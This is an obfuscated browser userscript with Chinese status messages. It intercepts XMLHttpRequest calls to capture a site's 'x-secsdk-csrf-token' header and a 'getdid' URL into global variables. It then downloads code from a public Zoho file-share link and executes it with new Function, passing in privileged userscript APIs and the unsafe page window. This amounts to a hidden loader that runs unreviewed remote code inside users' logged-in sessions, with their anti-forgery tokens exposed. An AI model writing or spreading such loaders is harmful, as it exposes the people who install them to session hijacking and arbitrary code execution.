//Wed Nov 12 2025 13:58:39 GMT+0000 (Coordinated Universal Time)
//
//
(function () {
  "use strict";
  const _0x2c5285 = window.XMLHttpRequest.prototype.setRequestHeader;
  window.XMLHttpRequest.prototype.setRequestHeader = function (_0x290905, _0x34861a) {
    {
      if (!this.customHeaders) {
        this.customHeaders = {};
      }
      this.customHeaders[_0x290905] = _0x34861a;
      if (_0x290905.toLowerCase() === "x-secsdk-csrf-token") {
        {
          window.csrfToken = _0x34861a;
        }
      }
      return _0x2c5285.apply(this, arguments);
    }
  };
  const _0x57187c = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function (_0x59f6ef, _0x3520ab, _0xeae580, _0x4c7b32, _0xc48226) {
    {
      if (_0x59f6ef.toUpperCase() === "GET" && _0x3520ab.includes("getdid?")) {
        {
          window.userurl = _0x3520ab;
        }
      }
      return _0x57187c.apply(this, arguments);
    }
  };
  function _0x1eef49(_0xcf6b37, _0x80d6e6 = 3000, _0x5d963e = {}) {
    {
      const _0x3b87de = document.createElement("div");
      _0x3b87de.textContent = _0xcf6b37;
      const _0x904f6c = {
        position: "fixed",
        bottom: _0x5d963e.bottom || "20px",
        left: _0x5d963e.left || "50%",
        transform: _0x5d963e.transform || "translateX(-50%)",
        background: _0x5d963e.background || "#333",
        color: _0x5d963e.color || "#fff",
        padding: _0x5d963e.padding || "15px 25px",
        borderRadius: _0x5d963e.borderRadius || "5px",
        boxShadow: _0x5d963e.boxShadow || "0 2px 10px rgba(0,0,0,.2)",
        opacity: 0,
        transition: "opacity .3s",
        maxWidth: _0x5d963e.maxWidth || "300px",
        textAlign: _0x5d963e.textAlign || "center",
        zIndex: _0x5d963e.zIndex || 10000
      };
      Object.assign(_0x3b87de.style, _0x904f6c);
      document.body.appendChild(_0x3b87de);
      requestAnimationFrame(() => _0x3b87de.style.opacity = 1);
      setTimeout(() => {
        _0x3b87de.style.opacity = 0;
        setTimeout(() => _0x3b87de.remove?.(), 300);
      }, _0x80d6e6);
    }
  }
  const _0x3c38d0 = Date.now();
  let _0x4918dc = null;
  let _0x448421 = 0;
  const _0x4e5753 = 15;
  let _0x44ed1a = false;
  GM_xmlhttpRequest({
    method: "GET",
    url: "https://files.zohopublic.com.cn/public/workdrive-public/download/w86hsc8e09411e0e8413ab8fd0cd971a19277?x-cli-msg=%7B%22linkId%22%3A%221rINvdZh7C1-330F6%22%2C%22isFileOwner%22%3Afalse%2C%22version%22%3A%221.0%22%2C%22isWDSupport%22%3Afalse%7D?v=" + _0x3c38d0,
    onload: function (_0x314c9a) {
      {
        _0x4918dc = _0x314c9a.responseText;
      }
    },
    onerror: function () {
      {
        _0x4918dc = "";
      }
    }
  });
  const _0x27cb01 = setInterval(() => {
    {
      if (_0x44ed1a) {
        return;
      }
      if (++_0x448421 > _0x4e5753) {
        {
          clearInterval(_0x27cb01);
          alert("获取脚本重试15次失败，可能是服务器异常，请更新脚本或加群反馈！");
          return;
        }
      }
      if (_0x4918dc && _0x4918dc.includes("威龙")) {
        {
          _0x44ed1a = true;
          clearInterval(_0x27cb01);
          _0x1eef49("脚本加载成功", 5000, {
            background: "#4CAF50",
            color: "#fff",
            padding: "20px 30px",
            borderRadius: "10px",
            boxShadow: "0 5px 15px rgba(0,0,0,.3)"
          });
          try {
            {
              new Function("GM_fetch", "GM_xmlhttpRequest", "unsafeWindow", "window", ";(function(fetch, GM_xmlhttpRequest, unsafeWindow, window){\n    " + _0x4918dc + "\n  })(fetch, GM_xmlhttpRequest, unsafeWindow, window);")(fetch, GM_xmlhttpRequest, unsafeWindow, window);
            }
          } catch (_0x31e002) {
            {
              console.error("脚本执行出错：", _0x31e002);
              _0x1eef49("脚本运行异常，已终止！", 5000, {
                background: "#e53935"
              });
            }
          }
          _0x4918dc = null;
        }
      }
    }
  }, 1000);
})();